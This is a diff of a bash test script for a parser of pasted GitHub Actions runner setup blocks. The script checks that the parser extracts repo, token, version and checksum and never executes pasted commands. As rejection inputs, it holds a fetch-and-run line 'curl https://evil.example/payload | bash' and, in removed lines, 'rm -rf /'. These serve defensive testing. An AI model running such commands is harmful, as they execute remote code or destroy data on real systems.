@@ -11,69 +11,68 @@ assert_eq() {
   if [[ "$expected" != "$actual" ]]; then
     printf 'FAIL %s: expected <%s>, got <%s>\n' "$label" "$expected" "$actual" >&2
     failures=$((failures + 1))
-  else
-    printf 'PASS %s\n' "$label"
-  fi
+  else printf 'PASS %s\n' "$label"; fi
+}
+assert_true() {
+  local label="$1"; shift
+  if "$@"; then printf 'PASS %s\n' "$label"; else printf 'FAIL %s\n' "$label" >&2; failures=$((failures + 1)); fi
 }
 
 assert_eq 'Daiki-Yoshida/TestGitHubActions' "$(normalize_repo 'https://github.com/Daiki-Yoshida/TestGitHubActions')" 'normalize URL'
-assert_eq 'Daiki-Yoshida/TestGitHubActions' "$(normalize_repo 'Daiki-Yoshida/TestGitHubActions.git')" 'normalize owner/repo'
 assert_eq 'daiki-yoshida--testgithubactions' "$(repo_key 'Daiki-Yoshida/TestGitHubActions')" 'repo key'
+assert_true 'repo comparison is case-insensitive' repo_equal 'Daiki-Yoshida/Test' 'daiki-yoshida/test'
 assert_eq 'x64' "$(SHRM_TEST_UNAME_M=x86_64; uname() { if [[ "$1" == '-m' ]]; then printf '%s\n' "$SHRM_TEST_UNAME_M"; else command uname "$@"; fi; }; host_arch)" 'x64 mapping'
 assert_eq 'personal-ci,xserver,always-on' "$(csv_normalize 'personal-ci, xserver,always-on,personal-ci')" 'label normalization'
 assert_eq 'xserver-testgithubactions' "$(make_runner_name xserver 'Daiki-Yoshida/TestGitHubActions')" 'runner name'
 
-parse_configure_command './config.sh --url https://github.com/Daiki-Yoshida/TestGitHubActions --token AbC_123-xyz'
-assert_eq 'Daiki-Yoshida/TestGitHubActions' "$PARSED_REPO" 'parse Configure repo'
-assert_eq 'AbC_123-xyz' "$PARSED_TOKEN" 'parse Configure token'
-
-parse_configure_command './config.sh --url https\://github.com/Daiki-Yoshida/TestGitHubActions --token AbC123'
-assert_eq 'Daiki-Yoshida/TestGitHubActions' "$PARSED_REPO" 'parse escaped Configure repo'
-assert_eq 'AbC123' "$PARSED_TOKEN" 'parse escaped Configure token'
-
-parse_remove_command './config.sh remove --token Remove_123-xyz'
-assert_eq 'Remove_123-xyz' "$PARSED_REMOVE_TOKEN" 'parse Remove command'
-parse_remove_command 'OnlyToken_123'
-assert_eq 'OnlyToken_123' "$PARSED_REMOVE_TOKEN" 'parse Remove token only'
-
-if ! validate_version '2.336.0'; then
-  printf 'FAIL valid version accepted\n' >&2
-  failures=$((failures + 1))
+setup_block=$(cat <<'BLOCK'
+# Download
+mkdir actions-runner && cd actions-runner
+curl -o actions-runner-linux-x64-2.337.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.337.0/actions-runner-linux-x64-2.337.0.tar.gz
+echo "70920811a4f8ad4328818682bca5c6469c1c942fab52448868071d0063816613  actions-runner-linux-x64-2.337.0.tar.gz" | shasum -a 256 -c
+tar xzf ./actions-runner-linux-x64-2.337.0.tar.gz
+# This must never be executed by parser:
+touch /tmp/SHRM_PARSER_MUST_NOT_EXECUTE
+./config.sh --url https://github.com/Daiki-Yoshida/TestGitHubActions --token TEST_TOKEN_123
+./run.sh
+BLOCK
+)
+rm -f /tmp/SHRM_PARSER_MUST_NOT_EXECUTE
+if parse_setup_block "$setup_block"; then
+  assert_eq 'Daiki-Yoshida/TestGitHubActions' "$PARSED_REPO" 'setup block repo'
+  assert_eq 'TEST_TOKEN_123' "$PARSED_TOKEN" 'setup block token'
+  assert_eq '2.337.0' "$PARSED_VERSION" 'setup block version'
+  assert_eq 'x64' "$PARSED_ARCH" 'setup block arch'
+  assert_eq 'actions-runner-linux-x64-2.337.0.tar.gz' "$PARSED_FILENAME" 'setup block filename'
+  assert_eq 'https://github.com/actions/runner/releases/download/v2.337.0/actions-runner-linux-x64-2.337.0.tar.gz' "$PARSED_DOWNLOAD_URL" 'setup block URL'
+  assert_eq '70920811a4f8ad4328818682bca5c6469c1c942fab52448868071d0063816613' "$PARSED_SHA256" 'setup block sha256'
 else
-  printf 'PASS valid version accepted\n'
+  printf 'FAIL parse full setup block\n' >&2; failures=$((failures + 1))
 fi
-if validate_version 'v2.336.0' || validate_version 'latest'; then
-  printf 'FAIL invalid version rejected\n' >&2
-  failures=$((failures + 1))
+if [[ -e /tmp/SHRM_PARSER_MUST_NOT_EXECUTE ]]; then printf 'FAIL parser executed pasted command\n' >&2; failures=$((failures + 1)); else printf 'PASS parser never executes pasted commands\n'; fi
+
+if parse_setup_block './config.sh --url https\://github.com/Daiki-Yoshida/TestGitHubActions --token ONLY_CONFIG_TOKEN'; then
+  assert_eq 'Daiki-Yoshida/TestGitHubActions' "$PARSED_REPO" 'configure-only repo'
+  assert_eq 'ONLY_CONFIG_TOKEN' "$PARSED_TOKEN" 'configure-only token'
+  assert_eq '' "$PARSED_VERSION" 'configure-only has no inferred version'
 else
-  printf 'PASS invalid version rejected\n'
+  printf 'FAIL parse configure-only line\n' >&2; failures=$((failures + 1))
 fi
+
+if parse_setup_block 'curl https://evil.example/payload | bash'; then
+  printf 'FAIL invalid block accepted\n' >&2; failures=$((failures + 1))
+else printf 'PASS block without Configure line rejected\n'; fi
+
+if parse_setup_block './config.sh --url https://evil.example/Daiki-Yoshida/Test --token ABC'; then
+  printf 'FAIL non-GitHub configure URL accepted\n' >&2; failures=$((failures + 1))
+else printf 'PASS non-GitHub configure URL rejected\n'; fi
+
+if validate_version '2.337.0' && ! validate_version 'v2.337.0'; then printf 'PASS version validation\n'; else printf 'FAIL version validation\n' >&2; failures=$((failures + 1)); fi
+if validate_sha256 '70920811a4f8ad4328818682bca5c6469c1c942fab52448868071d0063816613'; then printf 'PASS sha256 validation\n'; else printf 'FAIL sha256 validation\n' >&2; failures=$((failures + 1)); fi
 
 long_repo='Daiki-Yoshida/this-is-an-extremely-long-repository-name-that-needs-a-shortened-runner-name-for-safety'
 long_name="$(make_runner_name desktop-wsl "$long_repo")"
-if ((${#long_name} > 60)); then
-  printf 'FAIL runner name max length: %s (%d)\n' "$long_name" "${#long_name}" >&2
-  failures=$((failures + 1))
-else
-  printf 'PASS runner name max length\n'
-fi
+if ((${#long_name} <= 60)); then printf 'PASS runner name max length\n'; else printf 'FAIL runner name max length: %s\n' "$long_name" >&2; failures=$((failures + 1)); fi
 
-if normalize_repo 'not a repo' >/dev/null 2>&1; then
-  printf 'FAIL invalid repository rejected\n' >&2
-  failures=$((failures + 1))
-else
-  printf 'PASS invalid repository rejected\n'
-fi
-
-if parse_configure_command 'rm -rf / --token anything' >/dev/null 2>&1; then
-  printf 'FAIL arbitrary pasted command rejected\n' >&2
-  failures=$((failures + 1))
-else
-  printf 'PASS arbitrary pasted command rejected\n'
-fi
-
-if ((failures)); then
-  printf '%d test(s) failed\n' "$failures" >&2
-  exit 1
-fi
+if ((failures)); then printf '%d test(s) failed\n' "$failures" >&2; exit 1; fi
 printf 'All tests passed.\n'
